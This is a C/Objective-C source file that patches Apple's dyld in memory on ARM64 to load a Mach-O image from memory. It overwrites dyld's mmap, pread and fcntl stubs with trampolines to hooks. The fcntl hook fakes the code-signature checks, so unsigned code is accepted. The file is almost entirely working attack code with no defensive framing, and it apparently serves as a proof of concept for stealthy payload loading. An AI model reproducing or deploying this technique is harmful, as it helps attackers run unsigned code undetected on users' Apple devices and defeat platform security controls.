#import <Foundation/Foundation.h>

#include <dlfcn.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>
#include <mach-o/dyld_images.h>
#include "dyldpatch.h"

char *memoryLoadedFile = NULL;

// ldr x8, value; br x8; value: .ascii "\x41\x42\x43\x44\x45\x46\x47\x48"
char patch[] = {0x88,0x00,0x00,0x58,0x00,0x01,0x1f,0xd6,0x1f,0x20,0x03,0xd5,0x1f,0x20,0x03,0xd5,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41};

// Signatures to search for
char mmapSig[] = {0xB0, 0x18, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4};
char preadSig[] = {0x30, 0x13, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4};
char fcntlSig[] = {0x90, 0x0B, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4};

bool searchAndPatch(char *base, char *signature, int length, void *target) {
    
    char *patchAddr = NULL;
    kern_return_t kret;
    
    for(int i=0; i < 0x100000; i++) {
        if (base[i] == signature[0] && memcmp(base+i, signature, length) == 0) {
            patchAddr = base + i;
            break;
        }
    }
    
    if (patchAddr == NULL) {
        return FALSE;
    }
    
    kret = vm_protect(mach_task_self(), (vm_address_t)patchAddr, sizeof(patch), false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
    if (kret != KERN_SUCCESS) {
        return FALSE;
    }
    
    memcpy(patchAddr, patch, sizeof(patch));
    *(void **)((char*)patchAddr + 16) = target;
    
    kret = vm_protect(mach_task_self(), (vm_address_t)patchAddr, sizeof(patch), false, PROT_READ | PROT_EXEC);
    if (kret != KERN_SUCCESS) {
        return FALSE;
    }
    
    return TRUE;
}

const void* hookedMmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset) {
    char *alloc;
    char filePath[PATH_MAX];
    int newFlags;
    
    printf("[*] mmap Called: addr=%p len=%d prot=%x flags=%x fd=%d offset=%x\n", addr, len, prot, flags, fd, offset);
    
    memset(filePath, 0, sizeof(filePath));
    
    // Check if the file is our "in-memory" file
    if (fcntl(fd, F_GETPATH, filePath) != -1) {
        if (strstr(filePath, FILENAME_SEARCH) > 0) {
            
            printf("[*] mmap fd %d is for [%s]\n", fd, filePath);
            printf("[*] Redirecting mmap with memory copy\n");
            
            newFlags = MAP_PRIVATE | MAP_ANONYMOUS;
            if (addr != 0) {
                newFlags |= MAP_FIXED;
            }
            
            alloc = mmap(addr, len, PROT_READ | PROT_WRITE, newFlags, 0, 0);
            memcpy(alloc, memoryLoadedFile+offset, len);
            vm_protect(mach_task_self(), (vm_address_t)alloc, len, false, prot);
            return alloc;
        }
    }
    
    // If for another file, we pass through
    return mmap(addr, len, prot, flags, fd, offset);
}

ssize_t hookedPread(int fd, void *buf, size_t nbyte, int offset) {
    char filePath[PATH_MAX];
    
    printf("[*] pread Called: fd=%d buf=%p nbyte=%x offset=%x\n", fd, buf, nbyte, offset);
    
    memset(filePath, 0, sizeof(filePath));
    
    // Check if the file is our "in-memory" file
    if (fcntl(fd, F_GETPATH, filePath) != -1) {
        if (strstr(filePath, FILENAME_SEARCH) > 0) {
            
            printf("[*] pread fd %d is for [%s]\n", fd, filePath);
            printf("[*] Redirecting pread with memory copy\n");
            
            memcpy(buf, memoryLoadedFile+offset, nbyte);
            return nbyte;
        }
    }
    
    // If for another file, we pass through
    return pread(fd, buf, nbyte, offset);
}

int hookedFcntl(int fildes, int cmd, void* param) {
    
    char filePath[PATH_MAX];
    
    printf("[*] fcntl Called: fd=%d cmd=%x param=%p\n", fildes, cmd, param);
    
    memset(filePath, 0, sizeof(filePath));
    
    // Check if the file is our "in-memory" file
    if (fcntl(fildes, F_GETPATH, filePath) != -1) {
        if (strstr(filePath, FILENAME_SEARCH) > 0) {
            
            printf("[*] fcntl fd %d is for [%s]\n", fildes, filePath);
            
            if (cmd == F_ADDFILESIGS_RETURN) {
                
                printf("[*] fcntl F_ADDFILESIGS_RETURN received, setting 0xFFFFFFFF\n");
                
                fsignatures_t *fsig = (fsignatures_t*)param;
                
                // called to check that cert covers file.. so we'll make it cover everything ;)
                fsig->fs_file_start = 0xFFFFFFFF;
                return 0;
            }
            
            // Signature sanity check by dyld
            if (cmd == F_CHECK_LV) {
                
                printf("[*] fcntl F_CHECK_LV received, telling dyld everything is fine\n");
                
                // Just say everything is fine
                return 0;
            }
        }
    }
    
    return fcntl(fildes, cmd, param);
}

void *getDyldBase(void) {
    struct task_dyld_info dyld_info;
    mach_vm_address_t image_infos;
    struct dyld_all_image_infos *infos;
    
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    kern_return_t ret;
    
    ret = task_info(mach_task_self_,
                    TASK_DYLD_INFO,
                    (task_info_t)&dyld_info,
                    &count);
    
    if (ret != KERN_SUCCESS) {
        return NULL;
    }
    
    image_infos = dyld_info.all_image_info_addr;
    
    infos = (struct dyld_all_image_infos *)image_infos;
    return infos->dyldImageLoadAddress;
}

int readFile(char *path, char **data) {
    int fd;
    struct stat st;
    int bytesRead;
    
    fd = open(path, O_RDONLY);
    if (fd < 0) {
        return 0;
    }
    
    fstat(fd, &st);
    *data = malloc(st.st_size);
    
    bytesRead = read(fd, *data, st.st_size);
    close(fd);
    return bytesRead;
}

void patchDyld(char *path) {
        char *dyldBase;
        int fd;
        int size;
        void (*function)(void);
        NSObjectFileImage fileImage;
        
        // Read in our dyld we want to memory load... obviously swap this in prod with memory, otherwise we've just recreated dlopen :/
        size = readFile(path, &memoryLoadedFile);
        
        dyldBase = getDyldBase();
        searchAndPatch(dyldBase, mmapSig, sizeof(mmapSig), hookedMmap);
        searchAndPatch(dyldBase, preadSig, sizeof(preadSig), hookedPread);
        searchAndPatch(dyldBase, fcntlSig, sizeof(fcntlSig), hookedFcntl);
        
        //        // Set up blank content, same size as our Mach-O
        //        char *fakeImage = (char *)malloc(size);
        //        memset(fakeImage, 0x41, size);
        //
        //        // Small hack to get around NSCreateObjectFileImageFromMemory validating our fake image
        //        fileImage = (NSObjectFileImage)malloc(1024);
        //        *(void **)(((char*)fileImage+0x8)) = fakeImage;
        //        *(void **)(((char*)fileImage+0x10)) = size;
        //
        //        void *module = NSLinkModule(fileImage, "test", NSLINKMODULE_OPTION_PRIVATE);
        //        void *symbol = NSLookupSymbolInModule(module, "__Z5runmev");
        //        function = NSAddressOfSymbol(symbol);
        //        function();
        //
        void *lib = dlopen("/usr/lib/libffi-trampolines.dylib", RTLD_NOW);
        function = dlsym(lib, "_Z5runmev");
        
        printf("[*] Invoking loaded function at %p... hold onto your butts....!!\n", function);
        function();
    
}

